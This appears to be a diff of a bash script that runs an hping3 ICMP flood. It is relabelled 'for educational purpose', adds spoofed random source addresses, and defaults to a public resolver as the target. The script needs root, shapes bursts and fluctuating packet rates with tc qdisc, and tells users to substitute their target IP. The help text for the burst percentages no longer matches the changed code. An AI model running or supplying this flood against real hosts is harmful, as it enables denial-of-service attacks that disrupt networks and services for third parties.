@@ -1,22 +1,20 @@
 #!/bin/bash
 
 # =================================================================
-# HPING3 TRAFFIC SIMULATOR WITH PYTHON MATH ENGINE
+#             ICMP FLOOD FOR EDUCATIONAL PURPOSE
 # =================================================================
-# Sử dụng Python để tính toán các hàm toán học phức tạp
-# TC qdisc optimization với mathematical accuracy
 
-# Cấu hình mặc định
+# Default parameters
 TARGET_IP="${1:-8.8.8.8}"
 INTERFACE="${2:-eth0}"
 DURATION="${3:-300}"
-TIME_COMPRESSION="${4:-72}"
+TIME_COMPRESSION="${4:-288}"                        
 LOG_FILE="hping3_icmp_flood_$(date +%Y%m%d_%H%M%S).log"
 VERBOSE=true
 
-# Cấu hình TC QDISC
-PACKET_SIZE=60
-BURST_SIZE="64k"
+# TC QDISC config
+PACKET_SIZE=60        # bytes
+BURST_SIZE="64k"      # bits
 LATENCY="200ms"
 MIN_RATE="1kbit"
 MAX_RATE="1gbit"
@@ -26,14 +24,70 @@ HPING_PID=""
 TC_ACTIVE=false
 PYTHON_AVAILABLE=false
 
-# Hàm logging
+# Dependencies check
+check_dependencies() {
+    local missing_deps=()
+    
+    if ! command -v hping3 &> /dev/null; then        # check hping3
+        missing_deps+=("hping3")
+    fi
+    
+    if ! command -v bc &> /dev/null; then            # check bc
+        missing_deps+=("bc")
+    fi
+    
+    if ! command -v tc &> /dev/null; then            # check iproute2 or tc
+        missing_deps+=("iproute2")
+    fi
+    
+    if [[ $EUID -ne 0 ]]; then                       # check root
+        log "ERROR: Root privileges required"
+        exit 1
+    fi
+    
+    if [ ${#missing_deps[@]} -gt 0 ]; then           # print out all missing dependencies
+        log "ERROR: Missing dependencies: ${missing_deps[*]}"
+        exit 1
+    fi
+    
+    if ! ip link show "$INTERFACE" &>/dev/null; then        # check NIC name
+        log "ERROR: Interface $INTERFACE does not exist"
+        exit 1
+    fi
+}
+
+# Check Python availability
+check_python() {
+    if command -v python3 &> /dev/null; then
+        # Check python3 math libraries
+        if python3 -c "import math; print('Python math OK')" &>/dev/null; then
+            PYTHON_AVAILABLE=true
+            log "Python3 with math module: Available"
+            return 0
+        fi
+    fi
+        # Check python math libraries when user do not have python3
+    if command -v python &> /dev/null; then
+        if python -c "import math; print('Python math OK')" &>/dev/null; then
+            PYTHON_AVAILABLE=true
+            log "Python with math module: Available"
+            return 0
+        fi
+    fi
+    
+    log "WARNING: Python not available, falling back to simplified math"
+    PYTHON_AVAILABLE=false
+    return 1
+}
+
+# Logging Function
 log() {
     local message="$1"
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     echo "[$timestamp] $message" | tee -a "$LOG_FILE"
 }
 
-# Hàm cleanup
+# Cleanup Function - Clean all process
 cleanup() {
     log "=== CLEANUP STARTED ==="
     
@@ -59,31 +113,7 @@ cleanup() {
 
 trap cleanup EXIT INT TERM
 
-# Kiểm tra Python availability
-check_python() {
-    if command -v python3 &> /dev/null; then
-        # Test các thư viện math
-        if python3 -c "import math; print('Python math OK')" &>/dev/null; then
-            PYTHON_AVAILABLE=true
-            log "Python3 with math module: Available"
-            return 0
-        fi
-    fi
-    
-    if command -v python &> /dev/null; then
-        if python -c "import math; print('Python math OK')" &>/dev/null; then
-            PYTHON_AVAILABLE=true
-            log "Python with math module: Available"
-            return 0
-        fi
-    fi
-    
-    log "WARNING: Python not available, falling back to simplified math"
-    PYTHON_AVAILABLE=false
-    return 1
-}
-
-# Python script để tính toán traffic patterns
+# Python script for calculating traffic patterns
 create_python_calculator() {
     cat << 'PYTHON_SCRIPT' > /tmp/traffic_calculator.py
 #!/usr/bin/env python3
@@ -92,7 +122,7 @@ import sys
 
 def calculate_hourly_rate(hour, scale_factor=100):
     """
-    Tính toán traffic rate theo giờ với các peak patterns
+    Calculate traffic rate hourly with peak patterns
     """
     # Morning peak (9 AM) - Gaussian distribution
     morning_peak = 25 * math.exp(-((hour - 9) ** 2) / 6.25)
@@ -119,7 +149,7 @@ def calculate_hourly_rate(hour, scale_factor=100):
 
 def calculate_weekly_multiplier(day_of_week):
     """
-    Tính toán hệ số nhân theo ngày trong tuần
+    Calculate the multiplier factor by day of the week
     """
     base = 87
     
@@ -136,13 +166,13 @@ def calculate_weekly_multiplier(day_of_week):
 
 def calculate_minute_factor(minute_in_hour):
     """
-    Tính toán biến động theo phút trong giờ
+    Calculate the minute-by-minute variation within an hour
     """
     return 1 + 0.3 * math.sin(2 * math.pi * minute_in_hour / 60)
 
 def get_compressed_time(elapsed_seconds, compression_factor):
     """
-    Tính toán thời gian ảo với compression factor
+    Calculating virtual time with compression factor
     """
     virtual_hours = elapsed_seconds * compression_factor / 3600
     current_hour = int(virtual_hours % 24)
@@ -157,7 +187,7 @@ def get_compressed_time(elapsed_seconds, compression_factor):
 
 def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.15):
     """
-    Tính toán tổng hợp traffic rate với tất cả các yếu tố
+    Total traffic rate with multiple factors
     """
     # Get virtual time components
     hour, day, minute = get_compressed_time(elapsed_seconds, compression_factor)
@@ -179,7 +209,7 @@ def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.1
 
 def calculate_yoyo_rate(elapsed_seconds, cycle_duration=20, yoyo_type="square"):
     """
-    Tính toán yo-yo pattern rates
+    Calculating pattern rates
     """
     cycle_position = (elapsed_seconds % cycle_duration) / cycle_duration
     
@@ -191,10 +221,10 @@ def calculate_yoyo_rate(elapsed_seconds, cycle_duration=20, yoyo_type="square"):
         else:
             return 1000
     elif yoyo_type == "burst":
-        if cycle_position < 0.1:
+        if cycle_position < 0.2:
             return 10000
-        elif cycle_position < 0.2:
-            return 5000
+        elif cycle_position < 0.4:
+            return 4000
         else:
             return 2000
     else:
@@ -258,7 +288,7 @@ calculate_simple_rate() {
     echo "$final_rate"
 }
 
-# Chuyển đổi PPS sang bandwidth
+# Convert PPS to bandwidth
 pps_to_bandwidth() {
     local pps=$1
     local bps=$(echo "scale=0; $pps * $PACKET_SIZE * 8" | bc -l)
@@ -282,7 +312,7 @@ pps_to_bandwidth() {
     fi
 }
 
-# TC qdisc functions
+# TC qdisc init functions
 init_tc_qdisc() {
     log "Initializing TC qdisc on interface $INTERFACE"
     tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
@@ -297,6 +327,7 @@ init_tc_qdisc() {
     fi
 }
 
+# UPdate tc rate
 update_tc_rate() {
     local new_rate="$1"
     
@@ -319,12 +350,14 @@ update_tc_rate() {
     fi
 }
 
+# Init hping3 in background
 start_hping3_flood() {
-    log "Starting hping3 ICMP flood to $TARGET_IP"
+    log "Starting hping3 flood to $TARGET_IP"
     
     hping3 \
         -1 \
         --flood \
+        --rand-source \
         --interface "$INTERFACE" \
         "$TARGET_IP" \
         >> "$LOG_FILE" 2>&1 &
@@ -332,10 +365,10 @@ start_hping3_flood() {
     HPING_PID=$!
     
     if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
-        log "hping3 ICMP flood started successfully (PID: $HPING_PID)"
+        log "hping3 started successfully (PID: $HPING_PID)"
         return 0
     else
-        log "ERROR: Failed to start hping3 ICMP flood"
+        log "ERROR: Failed to start hping3"
         return 1
     fi
 }
@@ -444,39 +477,7 @@ generate_yoyo_pattern_python() {
         sleep $update_interval
         current_time=$((current_time + update_interval))
     done
-}
 
-# Dependencies check
-check_dependencies() {
-    local missing_deps=()
-    
-    if ! command -v hping3 &> /dev/null; then
-        missing_deps+=("hping3")
-    fi
-    
-    if ! command -v bc &> /dev/null; then
-        missing_deps+=("bc")
-    fi
-    
-    if ! command -v tc &> /dev/null; then
-        missing_deps+=("iproute2")
-    fi
-    
-    if [[ $EUID -ne 0 ]]; then
-        log "ERROR: Root privileges required"
-        exit 1
-    fi
-    
-    if [ ${#missing_deps[@]} -gt 0 ]; then
-        log "ERROR: Missing dependencies: ${missing_deps[*]}"
-        exit 1
-    fi
-    
-    if ! ip link show "$INTERFACE" &>/dev/null; then
-        log "ERROR: Interface $INTERFACE does not exist"
-        exit 1
-    fi
-}
 
 # Usage
 show_usage() {
@@ -493,7 +494,7 @@ PARAMETERS:
    TARGET_IP     : Target IP address (default: 8.8.8.8)
    INTERFACE     : Network interface (default: eth0)
    DURATION      : Test duration in seconds (default: 300)
-   COMPRESSION   : Time compression factor (default: 72x)
+   COMPRESSION   : Time compression factor (default: 288x)
    MODE          : Traffic pattern mode (see below)
    YOYO_TYPE     : Yo-yo pattern type (for python-yoyo mode only)
 
@@ -516,16 +517,16 @@ YOYO PATTERN TYPES (for python-yoyo mode):
                  └─ Linear increase 1000→10000 PPS (80%), then drop (20%)
                  
    burst       - Short bursts with cooldown periods
-                 └─ Burst: 5000 PPS (10%), Cooldown: 2500 PPS (10%), Idle: 1000 PPS (80%)
+                 └─ Burst: 5000 PPS (20%), Cooldown: 2500 PPS (40%), Idle: 1000 PPS (40%)
 
 ARCHITECTURE OVERVIEW:
-   ┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-   │  Python Engine  │───▶│  Traffic Pattern │───▶│   TC Qdisc      │
-   │  (Primary)      │    │   Calculation    │    │  (Bandwidth     │
-   │                 │    │                  │    │   Control)      │
-   │  Bash Fallback  │───▶│                  │    │                 │
-   │  (Backup)*      │    │                  │    │                 │
-   └─────────────────┘    └──────────────────┘    └─────────────────┘
+   ┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
+   │  Python Engine  │───▶│  Traffic Pattern │───▶ │   TC Qdisc      │
+   │  (Primary)      │     │   Calculation    │     │  (Bandwidth     │
+   │                 │     │                  │     │   Control)      │
+   │  Bash Fallback  │───▶│                   │    │                 │
+   │  (Backup)*      │     │                  │     │                 │
+   └─────────────────┘     └──────────────────┘     └─────────────────┘
    
    * Fallback chỉ available cho python-compressed mode
 
@@ -537,7 +538,7 @@ PYTHON INTEGRATION FEATURES:
    ✓ Automatic fallback to bash arithmetic when Python unavailable
    ✓ Real-time Python script generation (/tmp/traffic_calculator.py)
 
-EXAMPLES:
+EXAMPLES - CHANGE EXAMPLE IP TO TARGET IP:
    # Basic compressed time simulation (1 week compressed to ~4 minutes)
    # Uses Python math engine with fallback support
    $0 192.168.1.100 eth0 300 72 python-compressed
@@ -579,7 +580,7 @@ EXECUTION FLOW:
    2. Check Python availability (python3 + math module)  
    3. Create Python calculator script (if Python available)
    4. Initialize TC qdisc (Token Bucket Filter)
-   5. Start hping3 UDP flood (background process)
+   5. Start hping3 ICMP flood (background process)
    6. Main loop:
       - Calculate traffic rate (Python primary, bash fallback)
       - Convert PPS to bandwidth  
